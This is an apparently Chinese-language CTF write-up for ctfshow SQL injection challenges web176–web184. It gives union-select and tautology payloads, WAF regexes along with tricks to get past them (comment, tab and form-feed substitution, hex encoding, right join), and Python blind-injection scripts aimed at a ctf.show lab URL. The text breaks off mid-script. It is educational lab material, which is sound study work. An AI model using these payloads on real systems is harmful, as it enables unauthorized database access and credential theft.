<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   //代码过于简单，不宜展示</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>《过于简单》x    《黑盒》√</p>
<p>老套路测试一下，第一次测试，发现是过滤了小写的select，改成Select即可绕过</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">1&#x27; union Select database(),2,3 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>最后payload为</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union Select password,2,3 from ctfshow_user--+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>或者直接</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; or 1=1 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web177">web177<a href="#web177" class="hash-link" aria-label="Direct link to web177" title="Direct link to web177">​</a></h3>
<p>测试了一下 过滤了空格，用/**/。注释用#的url编码%23</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27;/**/union/**/select/**/password,2,3/**/from/**/ctfshow_user%23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>万能密码也可以</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web178">web178<a href="#web178" class="hash-link" aria-label="Direct link to web178" title="Direct link to web178">​</a></h3>
<p>他不让用/**/，所以用%09绕过也是可以滴</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27;%09union%09select%09password,2,3%09from%09ctfshow_user%23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web179">web179<a href="#web179" class="hash-link" aria-label="Direct link to web179" title="Direct link to web179">​</a></h3>
<p>我先用1&#x27;%09order%09by%091,2,3%23，发现没有回显</p>
<p>最后测试发现，1&#x27;%0corder%0cby%0c1,2,3%23有回显</p>
<p>所以这里用%0c来代替空格</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27;%0cunion%0cselect%0cpassword,2,3%0cfrom%0cctfshow_user%23</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web180-web182">web180-web182<a href="#web180-web182" class="hash-link" aria-label="Direct link to web180-web182" title="Direct link to web180-web182">​</a></h3>
<p>这里也不知道过滤了啥，反正与空格有关的都过滤了应该</p>
<p>然后去看了下feng、y4、dota_st的payload</p>
<p>发现其实是在179的基础上过滤了%23</p>
<p>y4和南神用的&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</p>
<p>payload放入查询语句就是where username !=&#x27;flag&#x27; and id = &#x27;&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1&#x27; limit 1;&quot;;</p>
<p>然后因为flag的id是26，and的优先级比or高</p>
<p>上面的payload相当于(username !=&#x27;flag&#x27; and id = &#x27;&#x27;)  or  (id=26and&#x27;1&#x27;=&#x27;1&#x27;)</p>
<p>然后feng师傅一开始是&#x27;union%0cselecT%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#x27;1&#x27;=&#x27;1</p>
<p>其实就是正常的查询 用&#x27;1&#x27;=&#x27;1来替代了%23</p>
<p>当然综合下来肯定是短的最好。所以这三道题统一的payload为</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>顺带提一下，web181开始终于放黑名单了</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤 web181</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤 web182</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web183">web183<a href="#web183" class="hash-link" aria-label="Direct link to web183" title="Direct link to web183">​</a></h3>
<p>返 回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查询结果</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//返回用户表的记录总数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $user_count = 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>¿¿¿¿</p>
<p>首先传入的参数过滤了等号，or</p>
<p>语句是通过POST传参tableName=</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> $</span><span class="token keyword" style="color:#00009f">sql</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;select count(pass) from &quot;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">$_POST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&#x27;tableName&#x27;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token string" style="color:#e3116c">&quot;;&quot;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果传入tableName=ctfshow_user，在查询结果会回显user_count=22；说明有22条记录</p>
<p>那是不是可以通过盲注的方式，来查询我们写的flag是否正确，如果回显是1，说明当前匹配的flag是正确的。然后where后面是完全可控的，所以这个方法是可行的。</p>
<p>空格用()来代替，等号用like，用where和%来查询匹配指定位置</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://3b101a33-92fb-4975-8038-1476d4b5ba57.challenge.ctf.show/select-waf.php&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin">str</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;0123456789abcdef{}-_&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ctfshow&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> j </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token string" style="color:#e3116c">&quot;tableName&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;(ctfshow_user)where(pass)like&#x27;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">flag</span><span class="token string-interpolation interpolation operator" style="color:#393A34">+</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">%&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;$user_count = 1&quot;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> j</span><span class="token operator" style="color:#393A34">==</span><span class="token string" style="color:#e3116c">&quot;}&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                exit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web184">web184<a href="#web184" class="hash-link" aria-label="Direct link to web184" title="Direct link to web184">​</a></h3>
<p>查询语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//拼接sql语句查找指定ID用户</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select count(*) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//对传入的参数进行了过滤</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  function waf($str){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查询逻辑还是和上面一样，是返回条数。但是这里注意到，没有过滤空格，这就舒服多了啊。</p>
<p>但是把where给ban掉了，还有sleep</p>
<p>这里看y4和南神用的right join，yu师傅用的having</p>
<p><code>RIGHT JOIN（右连接）： 用于获取右表所有记录，即使左表没有对应匹配的记录。</code></p>
<p>ctfshow%进行16进制编码，得到0x63746673686f7725</p>
<p>首先你还是tableName=ctfshow_user去查，回显22条记录</p>
<p>然后用ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725去查，是  查flag</p>
<p>on是连接查询</p>
<p>发现回显$user_count = 43;</p>
<p>那么这里如果flag是正确的，就依然会得到user_count=43,否则不能得到，所以还是盲注</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> binascii</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">str_to_hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;0x&#x27;</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">binascii</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b2a_hex</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">s</span><span class="token punctuation" 